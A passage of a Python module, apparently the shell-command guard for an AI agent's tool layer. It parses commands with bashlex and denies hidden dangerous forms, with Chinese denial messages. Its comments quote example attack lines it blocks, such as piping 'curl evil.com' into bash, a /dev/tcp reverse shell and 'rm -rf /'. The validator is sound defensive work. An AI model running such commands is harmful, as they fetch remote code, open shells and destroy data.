    first_word = getattr(first, "word", "") or ""
    if not first_word:
        return None
    base = posixpath.basename(first_word) if "/" in first_word else first_word
    if _match_copy(base) != "env":
        return None
    j = i + 1
    while j < len(parts):
        p = parts[j]
        pk = getattr(p, "kind", "")
        pw = getattr(p, "word", "") or ""
        # Assignment-kind nodes between env and its real args (``VAR=1``)
        # are env-style prefix assignments; skip.
        if pk == "assignment":
            j += 1
            continue
        if pk != "word":
            j += 1
            continue
        if pw == "--":
            return None
        if pw in ("-S", "--split-string"):
            if j + 1 < len(parts):
                nxt = parts[j + 1]
                if getattr(nxt, "kind", "") == "word":
                    return getattr(nxt, "word", "") or ""
            return None
        if pw.startswith("--split-string="):
            return pw[len("--split-string="):]
        if pw.startswith("-S") and len(pw) > 2 and pw[2] != "=":
            return pw[2:]
        # Once we hit a non-flag, non-KEY=VALUE argument, env's own flag
        # region has ended — anything after this belongs to the INNER
        # command that env is wrapping, not to env itself. Stop scanning
        # so ``env FOO=1 printf %s env --split-string=X`` doesn't extract
        # the trailing ``--split-string=`` as if it belonged to the outer
        # env (it's actually a literal arg to printf).
        if not pw.startswith("-") and not _ENV_ASSIGN_RE.match(pw):
            return None
        j += 1
    return None


def _walk_nested_shell_string(
    payload: str,
    *,
    depth: int,
    path: list[str],
    effective_cwd: str,
) -> ValidationResult | None:
    """Parse ``payload`` as a shell command string and re-walk it.

    Used for nested entry points where a dangerous command is smuggled
    inside a string argument:

    - ``bash -c "<payload>"`` / ``sh -c "<payload>"`` — the ``-c`` argument
      is itself a shell command string.
    - ``find … -exec <cmd> [args] ;`` — the exec sub-command, after token
      reconstruction, is equivalent to a shell command.

    ``depth`` is incremented so ``_MAX_AST_DEPTH`` still caps arbitrary
    nesting (``bash -c 'bash -c "bash -c …"'``). Parse failures deny the
    whole payload (fail-closed, I-N1.5).
    """
    if not payload:
        return None
    normalized = _normalize_for_parse(payload)
    if not normalized.strip():
        return None
    try:
        inner_nodes = bashlex.parse(normalized)
    except bashlex.errors.ParsingError as exc:
        return _parse_failed_result(
            reason_detail=f"nested shell 载荷解析失败: {exc}",
            effective_cwd=effective_cwd,
            ast_path=tuple(path),
            nested_depth=depth,
        )
    except Exception as exc:  # noqa: BLE001 — defensive per I-N1.1
        logger.warning(
            "nested shell payload bashlex internal: %s", type(exc).__name__,
        )
        return _parse_failed_result(
            reason_detail=f"nested shell 载荷 bashlex internal: {type(exc).__name__}",
            effective_cwd=effective_cwd,
            ast_path=tuple(path),
            nested_depth=depth,
        )
    for idx, inner in enumerate(inner_nodes):
        r = _walk_node(
            inner,
            depth=depth,
            path=path + [f"nested[{idx}]"],
            effective_cwd=effective_cwd,
        )
        if r is not None:
            return r
    return None


_FIND_SUBCMD_FLAGS = frozenset({"-exec", "-execdir", "-ok", "-okdir"})


def _extract_find_exec_subcmds(args: list[str]) -> list[list[str]]:
    """Extract every sub-command token list from a ``find`` argv — any of
    ``-exec`` / ``-execdir`` / ``-ok`` / ``-okdir``. A single ``find`` call
    may have multiple clauses (``find . -exec A \\; -ok B \\;``) — all are
    returned in encounter order.

    The ``-ok`` / ``-okdir`` variants prompt for interactive confirmation
    before running the sub-command, but any non-tty stdin (e.g.
    ``yes | find …`` or redirected input) auto-confirms, so from a N1
    policy standpoint they're identical to ``-exec`` / ``-execdir`` and
    must flow through the same re-walk.

    Each clause runs from the flag position +1 up to (but not including)
    the terminator ``;`` or ``+``. Missing terminator → best-effort, take
    the rest of ``args``.
    """
    subcmds: list[list[str]] = []
    i = 0
    n = len(args)
    while i < n:
        if args[i] in _FIND_SUBCMD_FLAGS:
            start = i + 1
            end = n
            for j in range(start, n):
                if args[j] in (";", "+"):
                    end = j
                    break
            if end > start:
                subcmds.append(args[start:end])
            i = end + 1
            continue
        i += 1
    return subcmds


def _walk_node(
    node,
    *,
    depth: int,
    path: list[str],
    effective_cwd: str,
) -> ValidationResult | None:
    """Recursively classify an AST subtree. None = benign.

    Contract per spec §5.5:
    - fail-closed on unknown kind → parse_failed
    - first-match-wins (returns ValidationResult on first hit)
    """
    if depth > _MAX_AST_DEPTH:
        return _parse_failed_result(
            reason_detail=f"AST 递归深度超过上限 {_MAX_AST_DEPTH}",
            effective_cwd=effective_cwd,
            ast_path=tuple(path),
            nested_depth=depth,
        )

    kind = getattr(node, "kind", "")

    if kind not in _KNOWN_BASHLEX_KINDS:
        logger.warning("shell_ast_validator: unknown bashlex kind=%s", kind)
        return _parse_failed_result(
            reason_detail=f"未识别的 AST 节点 kind=`{kind}` (bashlex 版本可能已升级)",
            effective_cwd=effective_cwd,
            ast_path=tuple(path + [f"unknown[{kind}]"]),
            nested_depth=depth,
        )

    if kind == "command":
        return _walk_command_node(node, depth, path, effective_cwd)

    if kind in ("pipe", "pipeline"):
        for i, child in enumerate(getattr(node, "parts", []) or []):
            sub_path = path + [f"pipe[{i}]"]
            r = _walk_node(child, depth=depth, path=sub_path, effective_cwd=effective_cwd)
            if r is not None:
                return r
        terminates, last_cmd = _pipe_terminates_in_shell(node)
        if terminates:
            return ValidationResult(
                allowed=False,
                code="network_exfil",
                category_zh=_CATEGORY_LABEL_ZH["network_exfil"],
                reason_detail=f"管道末端为 shell interpreter: `{last_cmd}`",
                ast_path=tuple(path + ["pipe_end", last_cmd]),
                nested_depth=depth,
                triggering_arg=last_cmd,
                effective_cwd=effective_cwd,
                suggested_alternative=_CANNED_SUGGESTIONS["network_exfil"],
            )
        return None

    if kind in ("compound", "list"):
        children = getattr(node, "list", None) or getattr(node, "parts", None) or []
        for i, child in enumerate(children):
            sub_path = path + [f"compound[{i}]"]
            r = _walk_node(child, depth=depth, path=sub_path, effective_cwd=effective_cwd)
            if r is not None:
                return r
        return None

    if kind == "word":
        for i, part in enumerate(getattr(node, "parts", []) or []):
            r = _walk_node(part, depth=depth, path=path + [f"word[{i}]"], effective_cwd=effective_cwd)
            if r is not None:
                return r
        return None

    if kind == "assignment":
        for i, part in enumerate(getattr(node, "parts", []) or []):
            r = _walk_node(part, depth=depth, path=path + [f"assignment[{i}]"], effective_cwd=effective_cwd)
            if r is not None:
                return r
        return None

    if kind == "commandsubstitution":
        inner = getattr(node, "command", None)
        if inner is None:
            return None
        return _walk_node(inner, depth=depth + 1, path=path + ["$()"], effective_cwd=effective_cwd)

    if kind == "processsubstitution":
        inner = getattr(node, "command", None)
        if inner is None:
            return None
        ps_type = getattr(node, "type", "") or "?"
        return _walk_node(inner, depth=depth + 1, path=path + [f"procsub[{ps_type}]"], effective_cwd=effective_cwd)

    if kind in ("redirect", "reservedword", "operator"):
        return None

    if kind in ("parameter", "tilde"):
        # Leaf expansion placeholders (``$FOO`` / ``${FOO}`` / ``~`` / ``~user``).
        # We intentionally do NOT evaluate them — there is no shell expansion in
        # a pure-sync validator. They carry no command semantics.
        return None

    return None


_ENV_ASSIGN_RE = _re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
# ``timeout`` duration token: float (``10``, ``0.5``) optionally suffixed with
# ``s`` / ``m`` / ``h`` / ``d``. Used to consume the duration positional only
# when it plausibly *is* a duration, so we never eat a legitimate command.
_TIMEOUT_DURATION_RE = _re.compile(r"^\d+(?:\.\d+)?[smhd]?$")

# Per-wrapper set of short/long flags that take a *separate* argument value.
# Without this table, ``sudo -u root rm -rf /`` or ``nice -n 5 rm -rf /``
# would treat the value (``root`` / ``5``) as the real command word, leaking
# the dangerous tail past the classifier. Long-flag ``=`` form
# (``--user=root``) is already handled by the ``-*`` skip branch below.
_WRAPPER_VALUE_FLAGS: dict[str, frozenset[str]] = {
    "sudo": frozenset({
        "-u", "--user", "-g", "--group", "-U", "--other-user",
        "-h", "--host", "-C", "--close-from", "-p", "--prompt",
        "-t", "--type", "-T", "--command-timeout",
        "-r", "--role",
    }),
    "nice": frozenset({"-n", "--adjustment"}),
    "ionice": frozenset({
        "-c", "--class", "-n", "--classdata",
        "-p", "--pid", "-P", "--pgid", "-u", "--uid",
    }),
    "timeout": frozenset({
        "-k", "--kill-after", "-s", "--signal",
    }),
    "env": frozenset({"-C", "--chdir", "-S", "--split-string", "-u", "--unset"}),
    "exec": frozenset({"-a"}),
    "stdbuf": frozenset({
        "-i", "--input", "-o", "--output", "-e", "--error",
    }),
    "command": frozenset(),
    "builtin": frozenset(),
    "nohup": frozenset(),
    "time": frozenset({"-o", "--output", "-f", "--format"}),
    "xargs": frozenset({
        "-a", "--arg-file", "-d", "--delimiter",
        "-E", "-I", "--replace",
        "-L", "-n", "--max-args",
        "-P", "--max-procs", "-s", "--max-chars",
    }),
}


def _resolve_effective_command(parts: list) -> tuple[str, int] | None:
    """Find the *effective* command word + its index in ``parts``, after:

    - skipping leading ``assignment`` nodes (``VAR=1 rm …`` — bashlex emits
      these as separate ``assignment``-kind siblings before the real command);
    - peeling recognised command wrappers (``env``, ``sudo``, ``nohup``,
      ``exec``, ``time``, ``nice``, ``ionice``, ``timeout``, ``command``,
      ``builtin``, ``stdbuf``) including the conventional flag / env-style
      argument forms they each accept;
    - applying ``posixpath.basename`` so ``/bin/rm`` or ``./rm`` normalise to
      ``rm`` and hit the classifier's exact-name set.

    Returns ``(cmd_word_basename, index_in_parts)`` or ``None`` when no
    resolvable command word is found (pure-assignment statement or excessive
    wrapper chain).

    Security: this helper is the single choke-point that prevents trivial
    N1 bypass via command wrapping. ``_classify_command`` MUST receive the
    resolved basename, not the raw ``parts[0].word``.
    """
    i = 0
    # Step 1: skip leading ``assignment``-kind nodes (``VAR=1 rm …``).
    while i < len(parts) and getattr(parts[i], "kind", "") == "assignment":
        i += 1

    # Step 2: peel wrappers with bounded iterations (guard against pathological
    # chains; I-N1.5 fail-closed is preferable to infinite loop).
    for _peel in range(8):
        if i >= len(parts):
            return None
        part = parts[i]
        if getattr(part, "kind", "") != "word":
            # Redirect / operator at this slot — no command candidate here.
            i += 1
            continue
        word = getattr(part, "word", "") or ""
        if not word:
            return None
        base = posixpath.basename(word) if "/" in word else word
        base_lc = _match_copy(base)
        if base_lc not in _COMMAND_WRAPPERS:
            return base, i  # resolved — real command found
        # Wrapper: advance past its own argument form.
        j = i + 1
        value_flags = _WRAPPER_VALUE_FLAGS.get(base_lc, frozenset())

        # Skip leading flags and env-style ``KEY=VALUE`` args between wrapper
        # and inner command. Stop on ``--`` (POSIX end-of-options) or on the
        # first word that is neither flag nor env-assignment. Flags listed
        # in ``_WRAPPER_VALUE_FLAGS[wrapper]`` swallow the following word
        # as their value (so ``sudo -u root rm`` → skip ``-u``, skip ``root``,
        # land on ``rm``).
        while j < len(parts):
            inner = parts[j]
            ik = getattr(inner, "kind", "")
            iw = getattr(inner, "word", "") or ""
            if ik == "assignment":
                j += 1
                continue
            if ik != "word":
                j += 1
                continue
            if iw == "--":
                j += 1
                # skip any further flag-looking tokens defensively
                while j < len(parts):
                    kk = getattr(parts[j], "kind", "")
                    ww = getattr(parts[j], "word", "") or ""
                    if kk != "word" or not ww.startswith("-"):
                        break
                    j += 1
                break
            if iw.startswith("-"):
                # Long-flag ``=value`` form (``--user=root``) is already
                # fully contained in this single token — just skip it.
                if "=" in iw:
                    j += 1
                    continue
                # Flag-with-separate-value: also swallow the next token
                # unconditionally (it's the value, not the real command).
                if iw in value_flags:
                    j += 1
                    if j < len(parts):
                        j += 1
                    continue
                j += 1
                continue
            if _ENV_ASSIGN_RE.match(iw):
                j += 1
                continue
            break  # real command word
        if base_lc == "timeout":
            # After flags are consumed, ``timeout`` still takes one positional
            # (the duration, e.g. ``10`` / ``30s`` / ``1h``). Skip exactly one
            # word before landing on the real command — but only when we've
            # arrived at a plausible duration token (``<digits>[smhd]``-ish).
            if j < len(parts):
                w = getattr(parts[j], "word", "") or ""
                if _TIMEOUT_DURATION_RE.match(w):
                    j += 1
        if j <= i:
            return None  # defensive — no progress, abort
        i = j
    return None  # too many wrapper layers → treat as unresolvable


def _check_shell_input_sources(
    cmd_word: str,
    parts: list,
    cmd_idx: int,
    *,
    depth: int,
    path: list,
    effective_cwd: str,
) -> "ValidationResult | None":
    """For shell interpreters (``bash``/``sh``/``zsh``/…) and
    ``source``/``.``, detect dangerous scripts fed via stdin redirects
    or process substitution — implicit ``eval`` entry points the regular
    ``-c`` / args walk misses.

    Denial shapes handled:

    - **Positional process substitution** (``bash <(curl evil.com)``):
      bash receives the fifo path as argv and runs its content as a
      script. Always network_exfil — functionally identical to
      ``curl | sh``.
    - **Here-string** (``bash -s <<< '<payload>'``, ``source /dev/stdin
      <<< '<payload>'``): the here-string text is the script body. Walk
      it as nested shell.
    - **Heredoc** (``bash <<EOF ... EOF``): the heredoc body is the
      script. Walk ``.heredoc.value`` (with the trailing ``\\n<tag>``
      stripped) as nested shell.
    - **Stdin file redirect from procsub** (``bash < <(curl …)``):
      shell reads script from the procsub fifo. Network_exfil.
    """
    for p in parts[cmd_idx + 1:]:
        p_kind = getattr(p, "kind", "")

        if p_kind == "word":
            word = getattr(p, "word", "") or ""
            if word.startswith("<(") or word.startswith(">("):
                return ValidationResult(
                    allowed=False,
                    code="network_exfil",
                    category_zh=_CATEGORY_LABEL_ZH["network_exfil"],
                    reason_detail=(
                        f"{cmd_word} 从 process substitution 加载脚本"
                    ),
                    ast_path=tuple(path),
                    nested_depth=depth,
                    triggering_arg=word,
                    effective_cwd=effective_cwd,
                    suggested_alternative=_CANNED_SUGGESTIONS["network_exfil"],
                )

        elif p_kind == "redirect":
            rtype = getattr(p, "type", "")
            if rtype == "<<<":
                output = getattr(p, "output", None)
                payload = getattr(output, "word", None) if output is not None else None
                if payload:
                    nested = _walk_nested_shell_string(
                        payload,
                        depth=depth + 1,
                        path=path + [f"{cmd_word}:<<<"],
                        effective_cwd=effective_cwd,
                    )
                    if nested is not None:
                        return nested
            elif rtype in ("<<", "<<-"):
                heredoc = getattr(p, "heredoc", None)
                if heredoc is not None:
                    raw_body = getattr(heredoc, "value", None)
                    if raw_body:
                        output = getattr(p, "output", None)
                        tag = getattr(output, "word", "") if output is not None else ""
                        body = raw_body
                        if tag:
                            suffix = "\n" + tag
                            if body.endswith(suffix):
                                body = body[: -len(suffix)]
                            elif body.endswith(tag):
                                body = body[: -len(tag)]
                        if body.strip():
                            nested = _walk_nested_shell_string(
                                body,
                                depth=depth + 1,
                                path=path + [f"{cmd_word}:heredoc"],
                                effective_cwd=effective_cwd,
                            )
                            if nested is not None:
                                return nested
            elif rtype == "<":
                output = getattr(p, "output", None)
                if output is not None:
                    for sub in getattr(output, "parts", []) or []:
                        if getattr(sub, "kind", "") == "processsubstitution":
                            return ValidationResult(
                                allowed=False,
                                code="network_exfil",
                                category_zh=_CATEGORY_LABEL_ZH["network_exfil"],
                                reason_detail=(
                                    f"{cmd_word} < <(…) 读取 process substitution"
                                ),
                                ast_path=tuple(path),
                                nested_depth=depth,
                                triggering_arg="< <(...)",
                                effective_cwd=effective_cwd,
                                suggested_alternative=_CANNED_SUGGESTIONS["network_exfil"],
                            )
    return None


def _walk_command_node(
    node,
    depth: int,
    path: list[str],
    effective_cwd: str,
) -> ValidationResult | None:
    """Classify a CommandNode via the wrapper-peel + basename resolver, then
    recurse into every ``parts`` member so nested ``$()`` / backtick / redirect
    targets still reach the classifier.
    """
    parts = getattr(node, "parts", []) or []
    if not parts:
        return _parse_failed_result(
            reason_detail="CommandNode 无 parts（可能是孤立 redirect）",
            effective_cwd=effective_cwd,
            ast_path=tuple(path + ["command[empty]"]),
            nested_depth=depth,
        )

    # ``env -S "<shell-string>"`` / ``env --split-string=…`` — the value is the
    # real shell command. Detect BEFORE the resolver runs, otherwise the
    # resolver consumes ``-S <value>`` as a wrapper flag-with-value and leaves
    # no command for classification → parse_failed false positive on benign
    # ``env -S 'ls -la'``.
    env_s_payload = _extract_env_s_payload(parts)
    if env_s_payload is not None:
        nested = _walk_nested_shell_string(
            env_s_payload,
            depth=depth + 1,
            path=path + ["env:-S"],
            effective_cwd=effective_cwd,
        )
        if nested is not None:
            return nested
        return None  # benign env -S payload — skip the parse_failed fall-through

    # Pure-assignment statement (``x=1``, ``name=world FOO=bar``) — legal
    # shell that sets env in the current shell without running a command.
    # Not a bypass, just the first clause of ``x=1; echo $x``-style lines.
    # We still walk inner ``.parts`` so dangerous substitutions inside the
    # assignment value (``x=$(rm -rf /)``) reach the walker.
    if all(getattr(p, "kind", "") == "assignment" for p in parts):
        for i, part in enumerate(parts):
            inner_parts = getattr(part, "parts", []) or []
            for j, inner in enumerate(inner_parts):
                r = _walk_node(
                    inner,
                    depth=depth,
                    path=path + [f"assignment[{i}]", f"part[{j}]"],
                    effective_cwd=effective_cwd,
                )
                if r is not None:
                    return r
        return None

    resolved = _resolve_effective_command(parts)
    if resolved is None:
        # Only reachable for malformed AST shapes (non-assignment but no
        # resolvable command) or wrapper chains > 8 deep. Fail-closed.
        return _parse_failed_result(
            reason_detail="CommandNode 无法定位有效命令词（过深 wrapper 链或未知形态）",
            effective_cwd=effective_cwd,
            ast_path=tuple(path + ["command[unresolved]"]),
            nested_depth=depth,
        )
    cmd_word, cmd_idx = resolved

    # Shell-input-script vector check: shell interpreters (``bash``/``sh``/…)
    # and ``source`` / ``.`` can receive scripts via stdin redirects
    # (``bash -s <<<…``, ``source /dev/stdin <<<…``, ``bash <<EOF…EOF``,
    # ``bash < <(curl …)``) or as positional process substitution
    # (``bash <(curl evil.com)``). The regular ``-c`` / args-walk never
    # reaches those payloads because the script body lives in the redirect
    # or procsub child. Dispatch to the dedicated extractor here.
    cmd_lc = _match_copy(cmd_word)
    if cmd_lc in _SHELL_INTERPRETERS or cmd_lc in ("source", "."):
        denial = _check_shell_input_sources(
            cmd_word,
            parts,
            cmd_idx,
            depth=depth,
            path=path,
            effective_cwd=effective_cwd,
        )
        if denial is not None:
            return denial

    # Collect args from parts AFTER the resolved command index (word + redirect
    # target surfacing, unchanged from T23/T28 fix for ``bash -i >& /dev/tcp``).
    args: list[str] = []
    for p in parts[cmd_idx + 1:]:
        p_kind = getattr(p, "kind", "")
        if p_kind == "word":
            w = getattr(p, "word", None)
            if w is not None:
                args.append(w)
        elif p_kind == "redirect":
            output = getattr(p, "output", None)
            if output is not None:
                ow = getattr(output, "word", None)
                if ow:
                    args.append(ow)

    classify_result = _classify_command(
        cmd_word, args, effective_cwd=effective_cwd,
        path=path + [f"command[{cmd_word}]"],
        depth=depth,
    )
    if classify_result is not None:
        return classify_result

    # Recurse into nested substitutions across the full parts list. We still
    # avoid reclassifying the prefix (assignments / wrappers / command word
    # itself) as commands, but we DO walk their inner ``.parts`` so dangerous
    # substitutions like ``VAR=$(rm -rf /) env rm foo`` still trip.
    for i, part in enumerate(parts):
        if i <= cmd_idx:
            inner_parts = getattr(part, "parts", []) or []
            for j, inner in enumerate(inner_parts):
                r = _walk_node(
                    inner,
                    depth=depth,
                    path=path + [f"prefix[{i}]", f"part[{j}]"],
                    effective_cwd=effective_cwd,
                )
                if r is not None:
                    return r
            continue
        r = _walk_node(
            part,
            depth=depth,
            path=path + [f"command[{cmd_word}]", f"arg[{i}]"],
            effective_cwd=effective_cwd,
        )
        if r is not None:
            return r

    return None


def validate(command: str, *, effective_cwd: str) -> ValidationResult:
    """Main entry point. Pure sync. NEVER raises (I-N1.1).

    Layer 0 fail-closed wrapper: any internal exception → parse_failed.
    """
    try:
        if len(command.encode("utf-8", errors="replace")) > MAX_COMMAND_BYTES:
            return ValidationResult(
                allowed=False, code="oversized_command",
                category_zh=_CATEGORY_LABEL_ZH["oversized_command"],
                reason_detail=f"命令长度 > {MAX_COMMAND_BYTES} 字节",
                ast_path=(), nested_depth=0, triggering_arg="",
                effective_cwd=effective_cwd,
                suggested_alternative=_CANNED_SUGGESTIONS["oversized_command"],
            )

        normalized = _normalize_for_parse(command)
        if not normalized.strip():
            return ValidationResult(
                allowed=True, code="ok", category_zh="", reason_detail="",
                ast_path=(), nested_depth=0, triggering_arg="",
                effective_cwd=effective_cwd, suggested_alternative="",
            )

        try:
            ast_nodes = bashlex.parse(normalized)
        except bashlex.errors.ParsingError as exc:
            return _parse_failed_result(
                reason_detail=f"bashlex ParsingError: {exc}",
                effective_cwd=effective_cwd,
            )
        except Exception as exc:
            logger.warning(
                "bashlex raised non-ParsingError for command: %s", type(exc).__name__,
            )
            return _parse_failed_result(
                reason_detail=f"bashlex internal: {type(exc).__name__}",
                effective_cwd=effective_cwd,
            )

        for idx, node in enumerate(ast_nodes):
            result = _walk_node(
                node, depth=0, path=[f"root[{idx}]"], effective_cwd=effective_cwd,
            )
            if result is not None:
                return result

        # Fallback preparse: bashlex 0.18 drops inner ``"…"`` quotes even
        # inside an outer ``'…'``, so nested payloads like
        # ``env --split-string=$'bash -lc "rm -rf /"'`` lose structure and
        # AST walk returns benign. Re-scan the raw input with payload
        # regexes — but only when the parsed AST shows a shell interpreter
        # (bash/sh/zsh/…) or ``env`` at command position. Without that
        # guard, literal payload text in comments / heredoc bodies /
        # positional data args (``printf %s bash -lc$'…'``) would
        # false-positively fail-closed.
        if _ast_has_shell_invoker_at_command_position(ast_nodes):
            preparse_hit = _preparse_ansi_c_payload_walks(
                command, depth=0, effective_cwd=effective_cwd,
            )
            if preparse_hit is not None:
                return preparse_hit

        return ValidationResult(
            allowed=True, code="ok", category_zh="", reason_detail="",
            ast_path=(), nested_depth=0, triggering_arg="",
            effective_cwd=effective_cwd, suggested_alternative="",
        )

    except Exception as exc:  # noqa: BLE001 — last-resort safety net per I-N1.1
        logger.exception("shell_ast_validator: internal crash (fail-closed)")
        return _parse_failed_result(
            reason_detail=f"validator internal exception (fail-closed): {type(exc).__name__}",
            effective_cwd=effective_cwd,
        )


def format_denied_content(result: ValidationResult, *, original_command: str = "") -> str:
    """Build 5-line template (6 lines when code=cwd_boundary).

    Template (spec §5.7):
        [AST 拦截] {category_zh}: {reason_detail}
        命令: {command (truncated to ≤205 chars)}
        命中路径: {ast_path joined " → "}
        触发参数: {triggering_arg or "-"}
        [允许范围: {effective_cwd}   <-- only when code=cwd_boundary]
        建议: {suggested_alternative}
    """
    triggering = result.triggering_arg if result.triggering_arg else "-"
    ast_path_str = " → ".join(result.ast_path) if result.ast_path else "-"
    cmd_line = _truncate_command_for_template(original_command)

    lines = [
        f"[AST 拦截] {result.category_zh}: {result.reason_detail}",
        f"命令: {cmd_line}",
        f"命中路径: {ast_path_str}",
        f"触发参数: {triggering}",
    ]
    if result.code == "cwd_boundary":
        lines.append(f"允许范围: {result.effective_cwd}")
    lines.append(f"建议: {result.suggested_alternative}")
    return "\n".join(lines)


def _truncate_command_for_template(command: str) -> str:
    """Head100 + ' ... ' + tail100 if > 200; else as-is (spec §5.7)."""
    if len(command) <= 200:
        return command
    return command[:100] + " ... " + command[-100:]


def to_typed_denied(result: ValidationResult, *, original_command: str = ""):
    """Build a typed Denied outcome for tool_node + _stage_s_ast_validate stub.

    Defers import to avoid circular import at module load.
    """
    from app.domain.models.tool_result import DecisionReason, Denied
    return Denied(
        content=format_denied_content(result, original_command=original_command),
        reason=DecisionReason(
            type="ast_validator",
            code=result.code,
            message=f"{result.category_zh}: {result.reason_detail}",
        ),
    )


def to_legacy_tool_result(result: ValidationResult, *, original_command: str = ""):
    """Build a legacy ToolResult for SkillTool._invoke_native integration."""
    from app.domain.models.tool_result import ToolResult
    return ToolResult(
        success=False,
        message=format_denied_content(result, original_command=original_command),
    )
